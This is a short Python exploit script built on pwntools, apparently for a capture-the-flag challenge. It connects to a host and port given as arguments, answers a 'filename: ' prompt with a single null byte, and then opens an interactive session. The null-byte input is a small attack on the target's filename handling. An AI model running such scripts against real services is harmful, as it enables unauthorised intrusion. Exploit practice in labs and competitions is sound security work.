from pwn import *
import sys

context.log_level = "INFO"


def init():
    p = remote(sys.argv[1], sys.argv[2])
    x = Exploit(p)
    return x, p
        

class Exploit:
    def __init__(self, p: process):
        self.p = p

    def send(self, content):
        p = self.p
        p.sendlineafter(b"filename: ", content)

x, p = init()
x.send(b"\x00")
p.interactive()